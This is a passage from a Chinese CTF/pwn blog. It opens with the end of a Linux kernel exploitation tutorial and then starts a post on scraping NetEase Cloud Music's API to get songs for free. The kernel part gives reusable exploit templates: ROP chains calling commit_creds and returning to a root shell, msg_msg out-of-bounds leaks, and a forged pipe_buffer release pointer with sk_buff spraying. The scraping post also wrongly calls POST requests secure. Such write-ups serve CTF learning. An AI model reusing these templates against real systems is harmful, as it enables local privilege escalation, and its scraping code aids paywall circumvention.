class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">  hijacked_stack_ptr[index++] = commit_creds;</span><br><span class="line">  hijacked_stack_ptr[index++] = swapgs;</span><br><span class="line">  hijacked_stack_ptr[index++] = iretq;</span><br><span class="line">  hijacked_stack_ptr[index++] = (<span class="keyword">u_int64_t</span>)getshell;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_cs;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rflags;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_rsp;</span><br><span class="line">  hijacked_stack_ptr[index++] = user_ss;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    write(fd, (<span class="keyword">void</span>*)info,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (race_flag) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这些 gadget 都可以通过 <code>ropper</code> 来找</li>
<li>commit_creds，prepare_kernel_cred 可以通过 <code>grep &lt;symbol_name&gt; /proc/kallsyms</code> 来找（记得开 root，关闭 kernel ASLR）</li>
<li>而 user_cs 这些寄存器的值，可以通过 <code>save_status</code> 来获取</li>
</ul>
<h2 id="msg-msg-leak"><a href="#msg-msg-leak" class="headerlink" title="msg_msg leak"></a>msg_msg leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *security;		<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>当我们在一个消息队列上发送多个消息时，会形成如下结构：（msg 双向链表）</p>
<img src="/2022/05/21/kernel%20attack/1656410685806.png" class width="1656410685806"> 
<ul>
<li>去除掉 <code>msg_msg</code> 结构体本身的 0x30 字节的部分（或许可以称之为 header）剩余的部分都用来存放用户数据</li>
<li>因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的 </li>
</ul>
<p>而当我们单次发送大于 [一个页面大小 - header size] 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体（只有一个 next 指针），其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p>
<img src="/2022/05/21/kernel%20attack/1656567331153.png" class width="1656567331153"> 
<ul>
<li>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体 </li>
<li>在读取 <code>msg_msg</code> 中的数据时，如果 <code>msg_msg-&gt;next</code> 不为空，程序就会把 <code>msg_msg-&gt;next</code> 指向的内容也当做是 <code>msg_msg data</code> 的一部分，如果 <code>msg_msgseg-&gt;next</code> 还不为空，就会继续读取 <code>msg_msgseg-&gt;next</code> 指向的内容</li>
</ul>
<p>利用-内核地址泄露：</p>
<ul>
<li>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，若是我们能够控制一个 msg_msg 的 header，将其 <code>msg_msg-&gt;m_ts</code> 成员改为一个较大的数，我们就能够越界读取出最多将近一张内存页大小的数据</li>
<li>若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们便能够完成内核空间中的任意地址读（<code>msg_msg-&gt;next</code> 指向的数据也会被当做 <code>msg_msg data</code>）<ul>
<li>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，我们需要保证该地址的数据为 NULL</li>
</ul>
</li>
</ul>
<p>相关接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建和获取ipc内核对象</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将消息发送到消息队列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从消息队列获取消息</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 查看、设置、删除ipc内核对象(用法和shmctl一样)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>msqid：消息队列的标识符，代表要从哪个消息列中获取消息</li>
<li>msgp： 存放消息结构体的地址（需要自己定义：<code>long type+char data[n]</code>）</li>
<li>msgsz：消息正文的字节数</li>
<li>msgtyp：消息的类型，可以有以下几种类型：<ul>
<li>msgtyp = 0：返回队列中的第一个消息</li>
<li>msgtyp &gt; 0：返回队列中消息类型为 msgtyp 的消息（常用）</li>
<li>msgtyp &lt; 0：返回队列中消息类型值小于或等于 msgtyp 绝对值的消息，如果这种消息有若干个，则取类型值最小的消息</li>
</ul>
</li>
<li>msgflg：函数的控制属性，其取值如下：<ul>
<li>0：msgrcv() 调用阻塞直到接收消息成功为止</li>
<li>MSG_NOERROR：若返回的消息字节数比 nbytes 字节数多,则消息就会截短到 nbytes 字节，且不通知消息发送进程</li>
<li>MSG_COPY：读取但不释放，当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</li>
<li>IPC_NOWAIT：调用进程会立即返回，若没有收到消息则立即返回 -1</li>
</ul>
</li>
</ul>
<p>PS：msg_msg 常常和 sk_buff 进行连用</p>
<h2 id="pipe-buffer-leak-attack"><a href="#pipe-buffer-leak-attack" class="headerlink" title="pipe_buffer leak+attack"></a>pipe_buffer leak+attack</h2><p><strong>pipe_buffer leak</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object </li>
<li>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址</li>
</ul>
<p><strong>pipe_buffer attack</strong></p>
<p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buf_operations-&gt;release</code> 这一指针，可以把它覆盖为 shellcode</p>
<p>参考模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>]; <span class="comment">/* 伪造的pipe_buf_operations */</span></span><br><span class="line">ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset; <span class="comment">/* 伪造的pipe_buf_operations-&gt;release */</span></span><br><span class="line"></span><br><span class="line">rop_idx = <span class="number">0</span>;</span><br><span class="line">rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">rop_chain[rop_idx++] = user_cs;</span><br><span class="line">rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">rop_chain[rop_idx++] = user_sp;</span><br><span class="line">rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/" class="post-title-link" itemprop="url">不务正业系列：白嫖网易云（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-19 11:57:59 / Modified: 22:31:33" itemprop="dateCreated datePublished" datetime="2022-05-19T11:57:59+08:00">2022-05-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><p>首先，感谢这位大佬的博客：（狗头保命）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zgbzbl/article/details/107773755">『Python』网易云音乐API爬虫 Am0xil的博客-CSDN博客 网易云音乐搜索接口</a> </p>
<p>网易云官方 API 接口地址：<a target="_blank" rel="noopener" href="https://music.163.com">https://music.163.com</a></p>
<p>大佬使用的 API：<a target="_blank" rel="noopener" href="https://music.163.com/weapi/cloudsearch/get/web?csrf_token=">https://music.163.com/weapi/cloudsearch/get/web?csrf_token=</a></p>
<ul>
<li>这个 API 是大佬用 F12 找的</li>
<li>我也找了找，没有找到</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652889291490-1652970678978.png" class width="1652889291490"> 
<ul>
<li>当时找到了“web?csrf_token”，但是没有发现歌曲的下载链接</li>
</ul>
<p>这里我先简述一下服务器请求机制：（之前在CSapp中学到过，也当是复习了吧）</p>
<p><strong>服务器请求</strong></p>
<p>一般的请求消息如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /home.html HTTP/1.0 <span class="comment">&lt;!-- 请求消息行 --&gt;</span></span><br><span class="line">Accept: */* <span class="comment">&lt;!-- 请求消息头 --&gt;</span></span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span><br><span class="line">Connection: close</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 消息正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>请求消息行：请求消息的第一行为请求消息行</p>
<ul>
<li>例如：GET  /test/test.html  HTTP/1.1</li>
<li>GET 为请求方式，请求方式分为：Get（默认）、POST、DELETE、HEAD等<ul>
<li>GET：明文传输 不安全，数据量有限，不超过1kb</li>
<li>POST：暗文传输，安全，数据量没有限制</li>
</ul>
</li>
<li>/test/test.html 为URI，统一资源标识符</li>
<li>HTTP/1.1 为协议版本</li>
</ul>
</li>
<li><p>请求消息头：从第二行开始到空白行统称为请求消息头（包含各种信息）</p>
</li>
<li><p>消息正文：当请求方式是[POST]方式时，才能看见消息正文，消息正文就是要传输的一些数据，如果没有数据需要传输时，消息正文为空</p>
</li>
</ul>
<p><strong>服务器响应</strong></p>
<p>一般的响应如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK <span class="comment">&lt;!-- 响应消息行 --&gt;</span></span><br><span class="line">Server: Tiny Web Server <span class="comment">&lt;!-- 响应消息头 --&gt;</span></span><br><span class="line">Content-length: 120</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 响应正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>响应消息行：第一行响应消息为响应消息行<ul>
<li>例如：HTTP/1.0 200 OK</li>
<li>HTTP/1.0 为协议版本</li>
<li>200 为响应状态码，常用的响应状态码有40余种，这里我们仅列出几种，详细请看：<ul>
<li>200：一切正常</li>
<li>302/307：临时重定向</li>
<li>304：未修改，客户端可以从缓存中读取数据，无需从服务器读取</li>
<li>404：服务器上不存在客户端所请求的资源</li>
<li>500：服务器内部错误</li>
</ul>
</li>
<li>OK 为状态码描述</li>
</ul>
</li>
<li>响应消息头：和请求消息头类似</li>
<li>响应正文：即网页的源代码（F12可查看）</li>
</ul>
<p>先看看大佬对请求的处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_music_list</span>(<span class="params">params, encSecKey</span>):</span></span><br><span class="line">    url = <span class="string">&quot;https://music.163.com/weapi/cloudsearch/get/web?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/search/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过歌曲的id获取播放链接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span>(<span class="params">params, encSecKey</span>):</span></span><br><span class="line">    url = <span class="string">&quot;https://music.163.com/weapi/song/enhance/player/url/v1?csrf_token=&quot;</span></span><br><span class="line">    payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br></pre></td></tr></table></figure>
<ul>
<li>requests.request(method,url,**kwargs) 的参数：<ul>
<li>method：请求类型（这里是”POST”）</li>
<li>url：请求对象的链接（这里是目标 API）</li>
<li>headers：请求头，直接 F12 查看，上面有什么条目直接抄<ul>
<li>PS：我 F12 看到的与作者代码中有不同的地方，但不影响结果</li>
</ul>
</li>
<li>data：字典、字节序列或文件对象，作为 Requests 的内容 </li>
</ul>
</li>
<li>最后返回服务器响应</li>
</ul>
<p>大佬这两个函数就是实现了 “获取歌曲列表，获取歌曲播放链接” 的功能（就是 url 不同）</p>
<ul>
<li>在查找界面 F12 截下的图（这个API和大佬用的不一样，爬取的歌单少一点）</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652892593720-1652970678978.png" class width="1652892593720">  
<ul>
<li>在播放界面 F12 截下的图（不知道大佬是怎么断定它就是播放链接的）</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652892892160-1652970678978.png" class width="1652892892160">  
<ul>
<li><p>请求头部分截取（主要是 cookie 太长了~）</p>
